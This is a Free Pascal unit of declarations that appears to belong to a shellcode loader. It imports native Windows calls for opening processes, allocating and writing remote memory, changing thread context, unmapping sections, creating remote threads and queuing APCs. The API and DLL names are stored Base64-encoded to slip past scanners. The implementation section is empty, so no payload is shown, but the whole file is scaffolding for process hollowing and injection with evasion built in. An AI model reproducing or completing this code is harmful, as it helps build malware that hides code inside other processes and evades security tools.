unit syscalls;

{$mode delphi}


 interface
uses
  Classes, SysUtils,runner,windows;




type
   TAPCPRoc = procedure(Data: ULONG_PTR); stdcall;




type
  PAPCFUNC = procedure(dwParam: ULONG_PTR); stdcall;
Type
  NTSTATUS = cardinal;
  PVOID = pointer;
  PPVOID = ^PVOID;
  PULONG = ULONG;


  type
    _CLIENT_ID = record
       UniqueProcess: tHANDLE;
       UniqueThread: tHANDLE;
     end;
     CLIENT_ID = _CLIENT_ID;
     PCLIENT_ID = ^CLIENT_ID;
     TClientID = CLIENT_ID;
     PClientID = ^TClientID;

  PUNICODE_STRING = ^UNICODE_STRING;
  UNICODE_STRING = record
    Length: Word;
    MaximumLength: Word;
    Buffer: PWideChar;
  end;

  POBJECT_ATTRIBUTES = ^OBJECT_ATTRIBUTES;
  OBJECT_ATTRIBUTES = record
    Length: DWORD;
    RootDirectory: thandle;
    ObjectName: PUNICODE_STRING;
    Attributes: DWORD;
    SecurityDescriptor: Pointer;
    SecurityQualityOfService: Pointer;
  end;
  TObjectAttributes =OBJECT_ATTRIBUTES;





  const



    {------LIST OF VARS }

    unsignedcharbuf = 'dW5zaWduZWRjaGFyYnVmW109';


{
 ***********************************************
}

 RPM_V = 'UmVhZFByb2Nlc3NNZW1vcnk=';
 CP_V  = 'Q3JlYXRlUHJvY2Vzc0E=';
 WPM   = 'V3JpdGVQcm9jZXNzTWVtb3J5';
 VALLOC = 'VmlydHVhbEFsbG9j';
 Rs_thread = 'UmVzdW1lVGhyZWFk';


 VLAEX = 'VmlydHVhbEFsbG9jRXg=';                                // VirtualAllocEx

 GTC = 'R2V0VGhyZWFkQ29udGV4dA==';                                //GetThreadContext
 STC = 'U2V0VGhyZWFkQ29udGV4dA==';
 KRN = 'a2VybmVsMzIuZGxs';

 NT_D = 'bnRkbGwuZGxs'; //n.t.d.ll
 NT_VLA = 'TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnk=';
 NT_VMS = 'TnRVbm1hcFZpZXdPZlNlY3Rpb24=';
 NDE = 'TnREZWxheUV4ZWN1dGlvbg==';




    function  RtlCreateUserThread(
      hProcess : HANDLE;
      SecurityDescriptor : PSECURITY_DESCRIPTOR;
      CreateSuspended : BOOLEAN;
      StackZeroBits : ULONG;
      StackReserve : ULONG;
      StackCommit : ULONG;
      lpStartAddress : pointer;
      lpParameter : pointer;
      phThread : PHANDLE;
      ClientId : PCLIENT_ID
    ): NTSTATUS; stdcall; external 'ntdll.dll';

    function  NtWriteVirtualMemory(
      ProcessHandle : HANDLE;
      BaseAddress : PVOID;
      Buffer : PVOID;
      BufferLength : ULONG;
      ReturnLength : PULONG
    ): NTSTATUS; stdcall; external 'ntdll.dll';

     function  NtAllocateVirtualMemory(
      ProcessHandle : HANDLE;
      BaseAddress : PPVOID;
      ZeroBits : ULONG;
      AllocationSize : PULONG;
      AllocationType : ULONG;
      Protect : ULONG
    ): NTSTATUS; stdcall; external 'ntdll.dll';

    function NtFreeVirtualMemory(
    hProcess: Cardinal;
    lpStartAddress: ppvoid;
    AllocationSize : PULONG;
    AllocationType : ULONG):
    Cardinal; stdcall; external 'ntdll.dll';

    function  NtOpenProcess(
      ProcessHandle : PHANDLE;
      DesiredAccess : ACCESS_MASK;
      ObjectAttributes : POBJECT_ATTRIBUTES;
      ClientId : PCLIENT_ID
    ): NTSTATUS; stdcall; external 'ntdll.dll';

    function OpenThread(dwDesiredAccess: DWORD; bInheritHandle: BOOL; dwThreadId: DWORD): DWORD;
    stdcall; external 'kernel32.dll';








var

  CP : function (lpApplicationName: PChar; lpCommandLine: PChar; lpProcessAttributes, lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PChar;
  const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;

  AllocX : function (hProcess: THandle; lpAddress: Pointer;
    dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer;stdcall;

  Alloc : function (lpAddress:LPVOID; dwSize:PTRUINT; flAllocationType:DWORD; flProtect:DWORD):LPVOID;
   Nt :   function (ProcessHandle: THandle; BaseAddress: Pointer): DWORD; stdcall;

   W_M : function (hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: PTRUINT; var lpNumberOfBytesWritten: PTRUINT): BOOL; stdcall;
   W_S : function (hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: PTRUINT; var lpNumberOfBytesWritten: PTRUINT): BOOL; stdcall;

   Get_Con : function (hThread: THandle; var lpContext: TContext): BOOL;stdcall;


   set_Con : function (hThread: THandle; const lpContext: TContext): BOOL; stdcall;

  res_thread: function (hThread:HANDLE):DWORD; stdcall;

  RPM: function (hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: PTRUINT; var lpNumberOfBytesRead: PTRUINT): BOOL; stdcall;

  TfnNtDE: function (Alertable: BOOLEAN; DelayInterval: PLARGE_INTEGER): NTSTATUS; stdcall;



  //external 'kernel32' name 'GetCurrentProcess';

  // NT sections

//  NtAllocateVirtualMemory : function (pi.hProcess, &allocation_start, 0, (PULONG)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
gg : function (
    ProcessHandle : HANDLE;
    BaseAddress : PPVOID;
    ZeroBits : ULONG;
    AllocationSize : PULONG;
    AllocationType : ULONG;
    Protect : ULONG
  ): NTSTATUS; stdcall;


function QueueUserAPC(pfnAPC: PAPCFUNC; hThread: HANDLE; dwData: ULONG_PTR): DWORD; external 'Kernel32.dll' name 'QueueUserAPC';





implementation







end.

